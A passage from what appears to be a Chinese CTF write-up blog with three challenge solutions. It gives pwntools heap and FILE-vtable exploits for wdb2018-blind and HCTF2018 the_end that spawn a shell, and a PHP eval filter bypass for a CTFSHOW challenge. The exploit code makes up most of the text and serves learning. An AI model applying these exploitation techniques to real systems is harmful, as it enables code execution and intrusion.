function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr, con</span>):</span><br><span class="line">    edt(<span class="number">3</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x13</span> + p64(addr))   <span class="comment"># write addr to ptr[0]</span></span><br><span class="line">    edt(<span class="number">0</span>, con)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400C75</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">get_shell = <span class="number">0x00000000004008E3</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;0000&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">edt(<span class="number">1</span>, p64(<span class="number">0x60203d</span>))	<span class="comment"># 修改在fastbin中的next</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)		<span class="comment"># 得到0x60204d</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x602100</span>, p64(<span class="number">0xfbada887</span>))	<span class="comment"># 写flag绕过检测</span></span><br><span class="line">write(<span class="number">0x6021d8</span>, p64(<span class="number">0x602200</span>))		<span class="comment"># 改写vtable指针</span></span><br><span class="line">write(<span class="number">0x602200</span>, p64(get_shell) * <span class="number">12</span>)	<span class="comment"># 改写fake_vtable内容</span></span><br><span class="line">write(<span class="number">0x602020</span>, p64(<span class="number">0x602100</span>))		<span class="comment"># 将stdout内容改为伪造的_IO_FILE</span></span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr, con</span>):</span><br><span class="line">    edt(<span class="number">5</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x13</span> + p64(addr))   <span class="comment"># write addr to ptr[0]</span></span><br><span class="line">    edt(<span class="number">0</span>, con)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400C75</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">get_shell = <span class="number">0x00000000004008E3</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;0000&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">edt(<span class="number">1</span>, p64(<span class="number">0x60203d</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x602070</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))   <span class="comment"># 选择ptr[2]作为fake chunk起点，则main_arena + 88会写入到ptr[4]，可控</span></span><br><span class="line">write(<span class="number">0x602070</span> + <span class="number">0x90</span>, p64(<span class="number">0x90</span>) + p64(<span class="number">0x21</span>))	<span class="comment"># 伪造下个chunk，绕过检测</span></span><br><span class="line">write(<span class="number">0x602070</span> + <span class="number">0x90</span> + <span class="number">0x20</span>, p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>))	<span class="comment"># 伪造下下个chunk，绕过检测</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x602060</span>, p64(<span class="number">0x602080</span>))	<span class="comment"># free，放入unsorted_bin</span></span><br><span class="line">dlt(<span class="number">0</span>)	</span><br><span class="line">edt(<span class="number">0</span>, <span class="string">b&#x27;&#x27;</span>)		<span class="comment"># 修改0x602080处字节为0x00， 则为__memalign_hook地址</span></span><br><span class="line">edt(<span class="number">4</span>, p64(get_shell) * <span class="number">3</span>)	<span class="comment"># 在__malloc_hook写入后门函数地址</span></span><br><span class="line">sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)	<span class="comment"># 触发malloc</span></span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/21/wdb2018-blind-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/16/HCTF2018-theEnd-wp/" >HCTF2018-the_end-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-16
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec the_end </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i ) &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>6#</code>直接泄露libc基地址    <code>10#</code>任意地址写5个字节   </p>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>开了 <strong>Full RELRO</strong>, got表写不了   也没有栈溢出  (要写返回地址也是一种可能  但是因为不知道栈地址  相当于四个字节的随机化  实现概率太小)</p>
<p>程序调用 <code>exit</code> 后，会调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数  可以改写<code>vtable</code>为<code>fake_vtable</code>（可写的区域）  然后改写对应<code>_setbuf</code>偏移处的函数指针为<code>one_gadget</code></p>
<p>注意由于<code>8#</code>关闭了输出流，执行 <code>exec /bin/sh 1&gt;&amp;0</code> 重定向 使输出可见</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pie b 0x000000000000093F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;gift &#x27;</span>)	<span class="comment"># 获取libc基地址</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;,&#x27;</span>).strip(<span class="string">b&#x27;,&#x27;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">ls(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">vtable_addr = libc_base + <span class="number">0x3C56F8</span>	<span class="comment"># vtable存放地址</span></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3C56c0</span>	</span><br><span class="line">gadget = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">li(<span class="string">&quot;vtable_addr: &quot;</span> + <span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):	<span class="comment"># 将fake_vtable写入原vtable存放处</span></span><br><span class="line">    s(p64(vtable_addr + i))</span><br><span class="line">    s(p8(p64(fake_vtable)[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):	<span class="comment"># 修改fake_vtable + 0x58函数（原vtable中的setbuf）地址为one_gadget</span></span><br><span class="line">    s(p64(fake_vtable + <span class="number">0x58</span> + i))</span><br><span class="line">    s(p8(p64(gadget)[i]))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)	<span class="comment"># 重定向使输出可见</span></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.wingszeng.top/pwn-file-exploitation-fake-vtable">https://blog.wingszeng.top/pwn-file-exploitation-fake-vtable</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/#2018-hctf-the_end">https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/#2018-hctf-the_end</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/09/16/HCTF2018-theEnd-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/12/CTFSHOW-shellmeRevenge-wp/" >CTFSHOW-shellmeRevenge-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-12
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://ctf.show/challenges#shellme_Revenge-1483">题目链接</a>   </p>
<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>进入页面看到<code>phpinfo</code>  php版本为<code>7.2.34</code>  再看到被禁用的函数<code>disable_function</code></p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/09/12/CTFSHOW-shellmeRevenge-wp/0x1.png?raw=true" alt="m"></p>
<p>发现 system, exec, shell_exec等都被禁用，但没有过滤<code>passthru</code></p>
<p>查看网络流  发现包头的cookie中有hint: <code>?looklook</code>  url加上?looklook&#x3D;1可以得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里发现过滤了除<code>C</code>以外的字母  除<code>0-3</code>以外的数字</p>
<p><code>^</code>被过滤  用不了异或；<code>~</code>被过滤  用不了取反   两个引号都被过滤</p>
<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><p>这里考虑自增   这里不知道是不是作者弄错了第10行中的判断条件用的是<code>||</code>  所以就算长度超了107也没事  那我们先不管长度  用自增构造<code>$_GET[1]($_GET[2])</code></p>
<p>注意因为过滤了引号   直接<code>$a._</code>也可以实现连接  但调试的话php版本最好也是7.2  高版本这种操作可能不行</p>
<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;	</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="comment">// $$_[1]($$_[2]));</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>去掉换行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]._;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<p>URL编码</p>
